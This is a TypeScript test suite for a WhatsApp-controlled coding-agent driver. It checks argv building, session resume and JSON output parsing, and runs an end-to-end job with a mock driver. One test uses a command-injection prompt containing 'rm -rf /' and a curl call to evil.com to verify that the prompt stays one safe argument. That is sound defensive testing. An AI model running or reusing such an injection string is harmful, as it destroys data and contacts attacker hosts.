import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import fs from 'node:fs';
import { AntigravityDriver } from '../src/agents/drivers/antigravity.driver.js';
import { getAgentDriver, registerAgentDriver } from '../src/agents/agent-registry.js';
import { initDatabase, closeDatabase, getDatabase } from '../src/database/connection.js';
import { processIncomingMessage } from '../src/router/command-router.js';
import { getJobById } from '../src/database/repositories/job.repo.js';
import { getActiveSession } from '../src/database/repositories/session.repo.js';
import { getActiveProject } from '../src/database/repositories/project.repo.js';
import { resetRateLimits } from '../src/security/rate-limiter.js';
import { config } from '../src/config.js';
import type { AgentRunOptions } from '../src/agents/agent-driver.interface.js';

const TEST_DB = path.resolve('./data/test_antigravity_driver.db');
const ADMIN_JID = `${config.ADMIN_PHONE_NUMBER}@s.whatsapp.net`;

test('Milestone 5A: AntigravityDriver Unit & Integration Suite', async (suite) => {
  const driver = new AntigravityDriver({ binaryPath: 'agy' });

  await suite.test('1. Registry: AntigravityDriver is registered under "antigravity" and "agy"', () => {
    const d1 = getAgentDriver('antigravity');
    const d2 = getAgentDriver('agy');
    assert.equal(d1.name, 'antigravity');
    assert.equal(d2.name, 'antigravity');
    assert.equal(d1.binaryName, 'agy');
  });

  await suite.test('2. Prompt / argv safety: buildCommandArgs creates safe array without shell interpolation', () => {
    const options: AgentRunOptions = {
      prompt: 'Fix authentication bug; rm -rf / | curl http://evil.com',
      cwd: '/workspace',
      config: {
        id: 'cfg_1',
        project_id: 'proj_1',
        model: 'gemini-3.7-flash-medium',
        permission_mode: 'ask',
        max_turns: 5,
        agent_output_format: 'json',
        whatsapp_render_mode: 'compact',
        updated_at: Date.now(),
      },
    };

    const args = driver.buildCommandArgs(options);

    // Verify argv structure
    assert.equal(args[0], 'agy');
    assert.equal(args[1], '-p');
    assert.equal(args[2], 'Fix authentication bug; rm -rf / | curl http://evil.com');
    assert.equal(args[3], '--output-format');
    assert.equal(args[4], 'json');
    assert.equal(args[5], '--model');
    assert.equal(args[6], 'gemini-3.7-flash-medium');

    // Verify prompt is kept as single exact argument
    assert.ok(!args.includes('rm'));
    assert.ok(!args.includes('curl'));
  });

  await suite.test('3. Session Resume: passes --conversation <id> when sessionRef is present', () => {
    const options: AgentRunOptions = {
      prompt: 'Continue previous instruction',
      cwd: '/workspace',
      config: {
        id: 'cfg_1',
        project_id: 'proj_1',
        model: 'default',
        permission_mode: 'ask',
        max_turns: null,
        agent_output_format: 'json',
        whatsapp_render_mode: 'compact',
        updated_at: Date.now(),
      },
      sessionRef: 'conv_12345_uuid',
    };

    const args = driver.buildCommandArgs(options);
    assert.ok(args.includes('--conversation'));
    const convIdx = args.indexOf('--conversation');
    assert.equal(args[convIdx + 1], 'conv_12345_uuid');
  });

  await suite.test('4. Structured output schema: --json-schema configured and applied to argv', () => {
    const schemaDriver = new AntigravityDriver({
      binaryPath: 'agy',
      jsonSchema: {
        type: 'object',
        properties: { status: { type: 'string' } },
        required: ['status'],
      },
    });

    const args = schemaDriver.buildCommandArgs({
      prompt: 'Check build',
      cwd: '/workspace',
      config: {} as any,
    });

    assert.ok(args.includes('--json-schema'));
    const schemaIdx = args.indexOf('--json-schema');
    assert.match(args[schemaIdx + 1], /"type":"object"/);
  });

  await suite.test('5. JSON normalization: standard SUCCESS output with token usage', () => {
    const rawStdout = JSON.stringify({
      conversation_id: '4f251f48-994e-4a54-8a4b-e4e781c28d10',
      status: 'SUCCESS',
      response: 'Successfully refactored user authentication.',
      duration_seconds: 4.85,
      num_turns: 2,
      usage: {
        input_tokens: 12500,
        output_tokens: 450,
        thinking_tokens: 300,
        cache_read_tokens: 8000,
        total_tokens: 12950,
      },
    });

    const result = driver.normalizeOutput(rawStdout, '', 0);

    assert.equal(result.isSuccess, true);
    assert.equal(result.summary, 'Successfully refactored user authentication.');
    assert.equal(result.conversationId, '4f251f48-994e-4a54-8a4b-e4e781c28d10');
    assert.equal(result.turnsUsed, 2);
    assert.equal(result.tokensIn, 12500);
    assert.equal(result.tokensOut, 450);
    assert.equal(result.thinkingTokens, 300);
    assert.equal(result.cacheReadTokens, 8000);
    assert.equal(result.totalTokens, 12950);
    assert.equal(result.costUsd, null); // Cost strictly remains null
  });

  await suite.test('6. Structured output normalization: extracts structured_output field', () => {
    const rawStdout = JSON.stringify({
      conversation_id: 'conv_structured_1',
      status: 'SUCCESS',
      response: 'JSON output generated.',
      duration_seconds: 1.2,
      num_turns: 1,
      structured_output: {
        files: ['auth.ts', 'server.ts'],
        passed: true,
      },
      usage: { input_tokens: 100, output_tokens: 50 },
    });

    const result = driver.normalizeOutput(rawStdout, '', 0);
    assert.equal(result.isSuccess, true);
    assert.deepEqual(result.structuredOutput, { files: ['auth.ts', 'server.ts'], passed: true });
  });

  await suite.test('7. Critical Rule: Non-success status with exit code 0 is treated as FAILED', () => {
    // When agy exits 0, but status is ERROR, CANCELED, WAITING, or INVALID
    const errorStatuses = ['ERROR', 'CANCELED', 'WAITING', 'INVALID', 'INTERRUPTED'];

    for (const st of errorStatuses) {
      const payload = JSON.stringify({
        conversation_id: 'conv_err_1',
        status: st,
        response: `Soft failure: operation could not proceed in mode ${st}`,
        num_turns: 1,
      });

      const res = driver.normalizeOutput(payload, '', 0);
      assert.equal(res.isSuccess, false, `Status ${st} with exitCode 0 must be marked isSuccess: false`);
      assert.match(res.summary, new RegExp(`\\[${st}\\]`));
    }
  });

  await suite.test('8. Malformed / unexpected non-JSON output handled gracefully without throwing', () => {
    const nonJsonStdout = 'Plain text response from non-json agent run.\nLine 2';
    const res = driver.normalizeOutput(nonJsonStdout, '', 0);

    assert.equal(res.isSuccess, false);
    assert.match(res.summary, /Plain text response/);
    assert.equal(res.tokensIn, null);
    assert.equal(res.tokensOut, null);
    assert.equal(res.costUsd, null);

    const emptyRes = driver.normalizeOutput('', 'Diagnostic error details', 1);
    assert.equal(emptyRes.isSuccess, false);
    assert.match(emptyRes.summary, /Diagnostic error details/);
  });

  await suite.test('9. Markdown code block wrapping JSON is extracted cleanly', () => {
    const wrappedStdout = [
      'Some logging before json...',
      '```json',
      JSON.stringify({
        status: 'SUCCESS',
        response: 'Clean response inside markdown',
        conversation_id: 'conv_md_1',
        usage: { input_tokens: 500, output_tokens: 100 },
      }),
      '```',
      'Trailing log line',
    ].join('\n');

    const res = driver.normalizeOutput(wrappedStdout, '', 0);
    assert.equal(res.isSuccess, true);
    assert.equal(res.summary, 'Clean response inside markdown');
    assert.equal(res.conversationId, 'conv_md_1');
    assert.equal(res.tokensIn, 500);
  });

  await suite.test('10. End-to-end integration: JobManager executes mock agy driver and saves conversation ID', async () => {
    if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
    initDatabase(TEST_DB);
    resetRateLimits(ADMIN_JID);

    // Create session
    await processIncomingMessage(ADMIN_JID, '/session new agy-test-session');
    // Switch to antigravity agent
    await processIncomingMessage(ADMIN_JID, '/agent antigravity');

    const project = getActiveProject(ADMIN_JID)!;
    const session = getActiveSession(project.id)!;
    assert.equal(project.selected_agent, 'antigravity');

    // Register a mock Antigravity driver that outputs valid agy JSON
    class MockAgyDriver extends AntigravityDriver {
      buildCommandArgs(options: AgentRunOptions): string[] {
        const payload = JSON.stringify({
          conversation_id: 'agy_conv_session_ref_888',
          status: 'SUCCESS',
          response: 'Antigravity executed task successfully.',
          duration_seconds: 2.1,
          num_turns: 1,
          usage: {
            input_tokens: 3000,
            output_tokens: 250,
            thinking_tokens: 100,
            cache_read_tokens: 1500,
            total_tokens: 3250,
          },
        });
        return [process.execPath, '-e', `console.log(${JSON.stringify(payload)})`];
      }
    }
    registerAgentDriver(new MockAgyDriver());

    const runRes = await processIncomingMessage(ADMIN_JID, '/run Antigravity task test');
    assert.match(runRes!, /Task #(\d+) Started/);
    const jobId = parseInt(runRes!.match(/Task #(\d+) Started/)![1], 10);

    // Wait for task completion
    const start = Date.now();
    while (Date.now() - start < 4000) {
      if (getJobById(jobId)?.status === 'COMPLETED') break;
      await new Promise((r) => setTimeout(r, 50));
    }

    const job = getJobById(jobId)!;
    assert.equal(job.status, 'COMPLETED');
    assert.equal(job.tokens_in, 3000);
    assert.equal(job.tokens_out, 250);
    assert.equal(job.cost_usd, null);
    assert.match(job.summary!, /Antigravity executed task successfully/);

    // Verify session updated with conversation ref
    const updatedSession = getActiveSession(project.id)!;
    assert.equal(updatedSession.agent_session_ref, 'agy_conv_session_ref_888');

    closeDatabase();
    if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
  });
});
